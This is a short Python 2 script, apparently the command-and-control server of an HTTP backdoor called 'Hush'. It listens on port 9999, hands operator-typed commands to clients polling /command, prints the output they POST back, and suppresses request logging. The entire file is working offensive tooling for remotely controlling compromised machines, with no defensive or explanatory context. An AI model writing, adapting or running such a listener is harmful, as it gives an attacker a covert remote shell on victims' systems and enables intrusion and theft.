#!/usr/bin/env python
import SimpleHTTPServer
import SocketServer

class HushServer(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/command':
            cmd = raw_input("Hush> ")
            print "[+] Executing: " + cmd
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            self.wfile.write(cmd)
            return
        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        self.data_string = self.rfile.read(int(self.headers['Content-Length']))
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        print "[+] Response: " + self.data_string
        return
    
    def log_request(self, format, *args):
        pass

Handler = HushServer
server = SocketServer.TCPServer(('0.0.0.0', 9999), Handler)

server.serve_forever()